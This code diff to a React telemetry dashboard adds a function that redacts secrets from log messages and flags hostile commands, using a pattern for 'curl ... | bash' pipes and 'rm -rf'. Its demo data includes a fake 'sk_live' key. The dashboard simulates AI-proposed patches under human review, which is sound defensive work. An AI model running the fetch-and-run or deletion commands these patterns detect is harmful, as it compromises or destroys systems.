+    appendMerkleLeaf(`gitops.pr.bulk_declined (${blockedPending.length} blocked)`, 'security-gate');
+    toast.error(`Bulk Refused ${blockedPending.length} Malicious Proposals`, {
+      description: 'All AST-blocked proposals refused and sealed to audit ledger.',
     });
   };
 
@@ -815,69 +1066,64 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
     });
   };
 
-  const synthesizeProposal = (service = 'order-service', summary?: string): string => {
-    const id = `task-${service.split('-')[0]}-${Math.floor(100 + Math.random() * 899)}`;
-    const newProp: PatchProposal = {
-      taskId: id,
-      title: `Autonomous Remediation: ${service}`,
-      target: `deployments/${service}-tuning.yaml`,
-      service,
-      severity: 'HIGH',
-      confidence: 95,
-      blastRadius: 'CONTAINED (1 SERVICE)',
-      astStatus: 'PASS',
-      astMessage: 'AST Gate Verified: Newly synthesized agent patch contains 0 forbidden shell primitives.',
-      status: 'PENDING',
-      rcaSummary:
-        summary ||
-        `Pi Agent synthesized causal fix for ${service} latency spike. Tunes circuit timeout ceiling and increases worker concurrency pool.`,
-      diff: [
-        `--- a/deployments/${service}-tuning.yaml`,
-        `+++ b/deployments/${service}-tuning.yaml`,
-        '@@ -8,5 +8,7 @@ spec:',
-        '   replicas: 3',
-        '-  maxConcurrentRequests: 100',
-        '+  maxConcurrentRequests: 250',
-        '+  circuitBreakerTimeoutMs: 1500',
-        '+  dlpInlineScrub: true',
-      ],
-    };
-    setProposals((prev) => [newProp, ...prev]);
-    toast.success('New Agent Patch Synthesized', {
-      description: `Queued ${id} in Autonomous Embassy for HITL review.`,
-    });
-    return id;
-  };
-
   const resetProposals = () => {
     setProposals(INITIAL_PROPOSALS);
-    toast.info('Proposal Queue Reset', { description: 'Restored all HITL proposals to PENDING state.' });
+    toast.info('Proposal Queue Reset', { description: 'Restored initial 5 HITL proposals to PENDING state.' });
+  };
+
+  const ingestCustomPayload = (service: string, severity: 'INFO' | 'WARNING' | 'CRITICAL', rawMessage: string) => {
+    const nowMs = Date.now();
+    const secretRegex = /(Bearer\s+[A-Za-z0-9\-._~+/]+=*|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{20,})/g;
+    const hasSecret = secretRegex.test(rawMessage);
+    const scrubbedMsg = rawMessage.replace(secretRegex, '[DLP:REDACTED_SECRET]');
+    const hasMaliciousCmd = /(curl\s+.*\|\s*(bash|sh)|rm\s+-rf)/i.test(rawMessage);
+
+    const newLog: TelemetryLog = {
+      id: `custom-${nowMs}`,
+      epochMs: nowMs,
+      timestamp: new Date(nowMs).toISOString(),
+      severity,
+      service,
+      message: scrubbedMsg,
+      dlpScrubbed: hasSecret,
+      suppressedCount: 1,
+      rawEnvelope: JSON.stringify(
+        {
+          ingestedAt: new Date(nowMs).toISOString(),
+          service,
+          severity,
+          dlpScrubbed: hasSecret,
+          astFlagged: hasMaliciousCmd,
+          sanitizedPayload: scrubbedMsg,
+        },
+        null,
+        2
+      ),
+    };
+
+    setLogs((prev) => [newLog, ...prev.slice(0, 199)]);
+
+    if (severity === 'CRITICAL' || hasMaliciousCmd) {
+      triggerProbe(service, true);
+      synthesizeProposal(
+        service,
+        `Auto-synthesized from custom ingested CRITICAL event: "${scrubbedMsg.slice(0, 80)}"`,
+        hasMaliciousCmd
+      );
+    }
+
+    appendMerkleLeaf('telemetry.custom.ingested', service);
+    toast.success('Custom Payload Ingested & Screened', {
+      description: `${hasSecret ? 'DLP Scrubbed secret! ' : ''}${severity === 'CRITICAL' ? 'Synthesized HITL patch & tripped circuit.' : 'Logged to WAL.'}`,
+    });
   };
 
   const injectAnomaly = () => {
-    const nowMs = Date.now();
-    const anomaly: TelemetryLog = {
-      id: `anomaly-${nowMs}`,
-      epochMs: nowMs,
-      timestamp: new Date(nowMs).toISOString(),
-      severity: 'CRITICAL',
-      service: 'egress-payments-api',
-      message: 'Token leak detected in outbound headers. Scrubbed [DLP:REDACTED_SECRET]. Rate limiter activated.',
-      dlpScrubbed: true,
-      suppressedCount: 19,
-      rawEnvelope: JSON.stringify({ service: 'egress-payments-api', leakedHeader: 'Bearer [DLP:REDACTED_SECRET]', action: 'SCRUB_AND_FENCE' }, null, 2),
-    };
-    setLogs((prev) => [anomaly, ...prev.slice(0, 199)]);
-    historyRef.current.push({
-      epochMs: nowMs,
-      throughput: 44.8,
-      latencyP50: 22.4,
-      latencyP99: 68.5,
-      errorRate: 3.15,
-      suppressed: 38,
-    });
-    setNowTick(nowMs);
-    toast.error('Live Anomaly & Spike Injected', { description: 'DLP scrub engine triggered; waveform spiked.' });
+    ingestCustomPayload(
+      'egress-payments-api',
+      'CRITICAL',
+      'Outbound header leak Authorization: Bearer sk_live_998877665544332211 detected during timeout spike.'
+    );
   };
 
   const emitHeartbeat = () => {
@@ -888,7 +1134,7 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
       timestamp: new Date(nowMs).toISOString(),
       severity: 'INFO',
       service: 'ingress-gateway',
-      message: 'Telemetry ingestion nominal: 22.4 evt/s. Ingestion key verified.',
+      message: 'Telemetry ingestion nominal: 24.2 evt/s. Ingestion key verified.',
       dlpScrubbed: false,
       suppressedCount: 1,
       rawEnvelope: JSON.stringify({ service: 'ingress-gateway', status: 'NOMINAL', latencyMs }, null, 2),
@@ -945,6 +1191,7 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
       circuitTripsCount: 3,
       astBlocksCount: 12,
       merkleVerificationsCount: merkleStatus.totalLeaves,
+      proposalsSynthesizedCount: proposals.length,
       peakThroughput: 34.8,
       peakLatencyP99: 46.2,
       heapEstimateMb: 42.4,
@@ -959,6 +1206,8 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
 
   const value = useMemo(
     () => ({
+      theme,
+      setTheme,
       user,
       loginUser,
       status,
@@ -977,11 +1226,14 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
       proposals,
       authorizePR,
       declinePR,
+      bulkApproveVerified,
+      bulkDeclineBlocked,
       reopenPR,
       rollbackPR,
       updateProposalDiff,
       synthesizeProposal,
       resetProposals,
+      ingestCustomPayload,
       ledger,
       merkleStatus,
       injectAnomaly,
@@ -992,7 +1244,7 @@ export function TelemetryProvider({ children }: { children: ReactNode }) {
       toggleWarpSpeed,
       resetStressTest,
     }),
-    [user, status, latencyMs, globalRange, customMinutes, series, logs, serviceCircuits, trippedCircuits, proposals, ledger, merkleStatus, stress]
+    [theme, user, status, latencyMs, globalRange, customMinutes, series, logs, serviceCircuits, trippedCircuits, proposals, ledger, merkleStatus, stress]
   );
 
   return <TelemetryContext.Provider value={value}>{children}</TelemetryContext.Provider>;
